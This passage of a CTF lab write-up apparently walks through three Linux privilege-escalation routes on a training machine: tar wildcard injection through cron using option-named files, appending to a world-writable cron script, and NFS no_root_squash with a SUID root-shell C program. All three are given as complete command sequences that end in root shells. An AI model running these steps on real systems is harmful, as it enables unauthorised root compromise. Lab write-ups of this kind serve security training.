![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/50.png)
The command execution successfully obtained a root shell.
### \[ Task17 - Privilege Escalation - Cron (Wildcards)\]
In Task17, the goal is to obtain a root shell by exploiting the wildcard vulnerability in the tar command.
Cron runs compress.sh every minute with root privileges, and inside compress.sh, tar processes files using the /home/user/\* wildcard.
Since tar cannot distinguish between file names and options, creating files named like tar options such as --checkpoint=1 and --checkpoint-action=exec=sh runme.sh causes tar to interpret them as options and execute runme.sh with root privileges.
(In a real scenario, first check cron settings with cat /etc/crontab and look for scripts executed without absolute paths or scripts that use wildcards. Then examine the content of those scripts to check for tar wildcard vulnerabilities, create malicious scripts and trigger files in a writable directory, and wait for cron to execute.)
**Command:**
```bash
cat /etc/crontab
# Check cron configuration
# Find scripts executed without absolute paths and scripts using wildcards

cat /usr/local/bin/compress.sh
# Check the contents of compress.sh
# Verify tar wildcard (*) usage
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/51.png)
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/52.png)
The command output confirmed that compress.sh is executed every minute with root privileges, and that tar inside compress.sh processes files using the /home/user/\* wildcard.
Since /home/user is a writable directory, creating files named --checkpoint=1 and --checkpoint-action=exec=sh runme.sh will cause tar to interpret them as options and execute runme.sh with root privileges.
**Command:**
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
# Write malicious script

chmod +x /home/user/runme.sh
# Grant execute permission

touch /home/user/--checkpoint=1
# Create a file that tar interprets as an option

touch '/home/user/--checkpoint-action=exec=sh runme.sh'
# Create an option file that executes runme.sh at checkpoints

# Wait 1 minute

/tmp/bash -p
# Execute SUID-enabled bash → root shell

id
# Verify root privileges
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/53.png)
The execution successfully obtained a root shell.
### \[ Task18 - Privilege Escalation - Cron (file Overwrite)\]
In Task18, unlike Task16, the goal is to obtain a root shell by directly modifying the overwrite.sh file itself.
If the script file executed by cron has incorrect permissions of -rwxrwxrwx, regular users can also modify the file. By directly appending malicious code, when cron executes the script every minute with root privileges, the malicious code runs as well, resulting in a root shell.
※ The correct permissions should be -rwxr-xr-x, allowing only the owner to write.
**Command:**
```bash
cat /etc/crontab
# Check cron configuration

ls -l /usr/local/bin/overwrite.sh
# Check overwrite.sh file permissions
# Check if a regular user can write to the file
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/54.png)
The command output confirmed that the /usr/local/bin/overwrite.sh file is writable by regular users.
Additionally, by inserting the command cp /bin/bash /tmp/bash; chmod +s /tmp/bash into overwrite.sh, when the cron job runs the script with root privileges, a bash binary with the SUID bit set is created in /tmp.
Afterward, executing /tmp/bash -p will obtain a root shell.
**Command:**
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
# Append malicious code to overwrite.sh
# >> = append to file (not overwrite)

# Wait 1 minute

/tmp/bash -p
# Execute root shell

id
# Verify root privileges
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/55.png)
The execution successfully obtained a root shell.
### \[ Task19 - Privilege Escalation - NFS Root Squashing\]
In the final Task19, the goal is to obtain root privileges by exploiting the no_root_squash vulnerability in NFS.
NFS is a protocol for mounting directories from remote servers on your local machine over a network. no_root_squash is one of the options in the NFS protocol.
With the default root_squash setting, even if a client accesses as root, the server downgrades the privileges. However, with no_root_squash configured, the client's root privileges are recognized as-is on the server.
This option should only be used in trusted internal network environments; if used in an environment exposed to external access, an attacker can create malicious files with root privileges from the client and obtain a root shell on the server.
### **(When GLIBC version matches)**
**Command (Kali):**
```bash
showmount -e <target IP>
# Check NFS mountable directories

mkdir <mount path>
# Create a directory to mount

mount -o rw,vers=3 <target IP>:<shared directory> <mount path>
# Mount the target server's shared directory on Kali

echo '#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > <mount path>/y.c
# Write malicious code

gcc <mount path>/y.c -o <mount path>/y
# Compile directly on Kali

chmod +s <mount path>/y
# Set SUID (recognized as root-owned on the target server due to no_root_squash)

ls -la <mount path>/y
# Verify -rwsr-sr-x 1 root root
```
**Command (Server shell):**
```bash
<shared directory>/y
# Execute malicious file

id
# Verify root privileges
```
### **(When GLIBC version differs)**
**Command (Kali):**
```bash
showmount -e <target IP>
# Check NFS mountable directories
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/56.png)
The directory check confirmed that /tmp is accessible from all clients.
※ \* = Shared with all clients without restriction to a specific client.
Next, /tmp of the target server is mounted on Kali, a malicious file is created, and SUID is set. Since Kali is running with root privileges, the file is recognized as root-owned on the target server as well due to the no_root_squash setting.
Therefore, executing the file on the target server will run it with root privileges due to SUID, obtaining a root shell.
**Command (Kali):**
```bash
mkdir <mount path>
# Create a directory to mount

mount -o rw,vers=3 <target IP>:<shared directory> <mount path>
# Mount the target server's shared directory on Kali

echo '#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > <mount path>/y.c
# Write malicious code

chmod 777 <mount path>/y.c
# Grant permissions to allow compilation on Debian
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/57.png)
**Command (Server shell):**
```bash
gcc <shared directory>/y.c -o <shared directory>/y
# Compile directly on the target server (to resolve GLIBC version issues)
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/58.png)
**Command (Kali):**
```bash
chown root:root <mount path>/y
# Change owner to root

chmod +s <mount path>/y
# Set SUID (recognized as root-owned on the target server due to no_root_squash)

ls -la <mount path>/y
# Verify -rwsr-sr-x 1 root root
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/59.png)
**Command (Server shell):**
```bash
<shared directory>/y
# Execute malicious file

id
# Verify root privileges
```
**Result:**
![](https://raw.githubusercontent.com/jaejun835/hacking-notes/main/Photo/Tryhackme%20challenge_KR/Tryhackme%20%7C%20Linux%20PrivEsc%20Arena%20%EC%B1%8C%EB%A6%B0%EC%A7%80/60.png)
The execution successfully obtained a root shell.
